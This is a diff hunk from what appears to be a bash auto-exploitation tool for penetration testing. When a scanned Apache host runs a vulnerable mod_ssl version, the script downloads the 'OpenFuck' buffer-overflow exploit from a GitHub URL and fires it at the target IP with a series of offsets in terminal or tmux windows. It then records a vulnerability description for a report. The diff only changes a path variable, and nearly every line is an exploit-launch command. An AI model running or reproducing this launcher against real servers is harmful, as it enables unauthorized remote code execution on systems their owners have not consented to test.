@@ -1491,31 +1491,31 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x70 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x71 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x55 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5c $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x70 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x71 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x55 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x5c $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x70 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x71 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x55 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5c $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x70 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x71 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x55 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x5c $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1526,33 +1526,33 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x76 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x77 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5d $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x63 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x69 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x76 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x77 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x5d $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x63 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x69 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x76 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x77 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5d $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x63 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x69 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x76 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x77 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x5d $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x63 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x69 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
